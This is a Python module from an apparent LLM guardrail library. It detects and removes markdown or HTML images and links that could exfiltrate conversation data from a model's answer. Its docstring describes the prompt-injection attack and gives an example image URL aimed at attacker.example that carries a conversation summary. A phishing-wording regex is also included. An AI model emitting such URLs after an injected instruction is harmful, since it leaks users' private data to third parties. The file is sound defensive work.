"""Data exfiltration through links and images in the model's answer.

The classic indirect-injection payoff: a hidden instruction makes the model write
`![](https://attacker.example/p.png?q=<conversation summary>)`. A chat UI that renders markdown fetches
the image automatically, and the query string delivers the data; no click needed. This guard finds every
URL in an answer (markdown images and links, reference links, HTML `img`/`a`, bare URLs), scores it by
destination (allow-listed or not), by form (images load by themselves) and by payload (long, encoded or
conversation-derived values in the query or path), and removes the dangerous ones.
"""

from __future__ import annotations

import math
import re
import time
from collections import Counter
from dataclasses import dataclass
from urllib.parse import parse_qsl, unquote, urlsplit

from bulwark.core import Action, Finding, GuardResult
from bulwark.policy import ExfiltrationConfig

_MD_IMAGE = re.compile(r"!\[([^\]\n]{0,300})\]\(\s*<?(https?://[^)\s>]+)>?(?:\s+\"[^\"]*\")?\s*\)", re.I)
_MD_LINK = re.compile(r"(?<!!)\[([^\]\n]{0,300})\]\(\s*<?(https?://[^)\s>]+)>?(?:\s+\"[^\"]*\")?\s*\)", re.I)
_MD_REF = re.compile(r"^[ \t]*\[([^\]\n]+)\]:[ \t]*<?(https?://\S+?)>?[ \t]*$", re.I | re.M)
_HTML_IMG = re.compile(r"<img\b[^>]*?\bsrc\s*=\s*[\"']?(https?://[^\"'\s>]+)[^>]*>", re.I)
_HTML_A = re.compile(r"<a\b[^>]*?\bhref\s*=\s*[\"']?(https?://[^\"'\s>]+)[^>]*>(.*?)</a>", re.I | re.S)
_BARE = re.compile(r"(?<![\w(\"'=<])https?://[^\s<>\"'`)\]]+", re.I)
_B64ISH = re.compile(r"^[A-Za-z0-9+/_=-]{24,}$")
_HEXISH = re.compile(r"^[0-9a-fA-F]{32,}$")
_EMAIL = re.compile(r"[\w.+-]+@[\w-]+(?:\.[\w-]+)+")
# Credential phishing: an answer that sends the reader to an unknown site to "verify" payment or login data.
_PHISHING = re.compile(
    r"\b(?:verify|confirm|update|re-?enter|validate|unlock|reactivate)\b[^.\n]{0,40}\b(?:your\s+|their\s+|the\s+)?"
    r"(?:card|payment|bank|billing|password|account|login|credentials|identity|details)\b",
    re.IGNORECASE,
)


@dataclass(frozen=True)
class UrlRef:
    kind: str  # image | link | reference | bare
    url: str
    start: int
    end: int
    label: str = ""


def find_urls(text: str) -> list[UrlRef]:
    refs: list[UrlRef] = []
    taken: list[tuple[int, int]] = []

    def add(kind: str, url: str, start: int, end: int, label: str = "") -> None:
        if any(s <= start < e for s, e in taken):
            return
        taken.append((start, end))
        refs.append(UrlRef(kind, url.rstrip(".,;:!?"), start, end, label))

    for match in _MD_IMAGE.finditer(text):
        add("image", match.group(2), match.start(), match.end(), match.group(1))
    for match in _HTML_IMG.finditer(text):
        add("image", match.group(1), match.start(), match.end())
    for match in _MD_LINK.finditer(text):
        add("link", match.group(2), match.start(), match.end(), match.group(1))
    for match in _HTML_A.finditer(text):
        add("link", match.group(1), match.start(), match.end(), re.sub(r"<[^>]+>", "", match.group(2)))
    for match in _MD_REF.finditer(text):
        add("reference", match.group(2), match.start(), match.end(), match.group(1))
    for match in _BARE.finditer(text):
        add("bare", match.group(0), match.start(), match.end())
    return sorted(refs, key=lambda ref: ref.start)


def host_allowed(host: str, allowed: list[str]) -> bool:
    host = host.lower().rstrip(".")
    return any(host == domain.lower() or host.endswith("." + domain.lower()) for domain in allowed)


def _entropy(value: str) -> float:
    counts = Counter(value)
    return -sum(n / len(value) * math.log2(n / len(value)) for n in counts.values()) if value else 0.0


def payload_signals(url: str, conversation: str = "") -> list[str]:
    """Reasons to believe the URL carries data (empty when it looks like an ordinary link)."""
    parts = urlsplit(url)
    values = [unquote(v) for _, v in parse_qsl(parts.query, keep_blank_values=True)]
    values += [unquote(segment) for segment in parts.path.split("/") if segment]
    if parts.fragment:
        values.append(unquote(parts.fragment))
    signals: list[str] = []
    conversation_lower = conversation.lower()
    for value in values:
        compact = value.strip()
        if not compact:
            continue
        words = re.findall(r"[^\W\d_]{2,}", compact)
        if _EMAIL.search(compact):
            signals.append("an email address in the URL")
        elif len(words) >= 4 and (" " in compact or "+" in compact or "_" in compact or "-" in compact):
            signals.append(f"text in the URL ({len(words)} words)")
        elif _HEXISH.match(compact) or (_B64ISH.match(compact) and _entropy(compact) > 4.0 and len(compact) >= 32):
            signals.append(f"an encoded value in the URL ({len(compact)} characters)")
        elif len(compact) >= 64:
            signals.append(f"a long value in the URL ({len(compact)} characters)")
        if conversation_lower and len(words) >= 3:
            phrase = " ".join(w.lower() for w in words[:6])
            joined = " ".join(re.findall(r"[^\W\d_]{2,}", conversation_lower))
            if phrase and phrase in joined:
                signals.append("conversation text in the URL")
    return list(dict.fromkeys(signals))


def check_exfiltration(text: str, config: ExfiltrationConfig, conversation: str = "") -> tuple[GuardResult, str]:
    """Score every URL in `text`; returns the result and the sanitized text (dangerous URLs removed)."""
    started = time.perf_counter()
    findings: list[Finding] = []
    replacements: list[tuple[int, int, str]] = []
    for ref in find_urls(text):
        host = (urlsplit(ref.url).hostname or "").lower()
        if not host or host_allowed(host, config.allowed_domains):
            continue
        signals = payload_signals(ref.url, conversation)
        if _PHISHING.search(text[max(0, ref.start - 120) : ref.end + 60]):
            signals.append("a request to verify payment or login details on that site")
        if ref.kind == "image":
            score = 0.95 if signals else (0.7 if config.block_unknown_images else 0.3)
        elif signals:
            score = 0.8 if ref.kind in {"link", "reference"} else 0.7
        else:
            score = 0.2
        reason = f"{ref.kind} to {host}, which is not on the allow-list"
        if signals:
            reason += " with " + ", ".join(signals)
        if ref.kind == "image":
            reason += " (images load automatically when the answer is displayed)"
        findings.append(
            Finding(
                rule=f"exfiltration.{ref.kind}" + (".payload" if signals else ""),
                layer="url",
                score=score,
                message=reason,
                start=ref.start,
                end=ref.end,
                snippet=ref.url[:200],
            )
        )
        if score >= config.threshold:
            if ref.kind == "image":
                replacement = f"[image removed by Bulwark: {host}]"
            elif ref.label.strip():
                replacement = f"{ref.label.strip()} [link removed by Bulwark: {host}]"
            else:
                replacement = f"[link removed by Bulwark: {host}]"
            replacements.append((ref.start, ref.end, replacement))

    sanitized = text
    for start, end, replacement in sorted(replacements, reverse=True):
        sanitized = sanitized[:start] + replacement + sanitized[end:]
    score = max((f.score for f in findings), default=0.0)
    triggered = score >= config.threshold
    result = GuardResult(
        guard="exfiltration",
        score=score,
        triggered=triggered,
        action=config.action if triggered else Action.ALLOW,
        explanation="; ".join(f.message for f in findings if f.score >= config.threshold),
        findings=findings,
        latency_ms=round((time.perf_counter() - started) * 1000, 2),
    )
    return result, sanitized
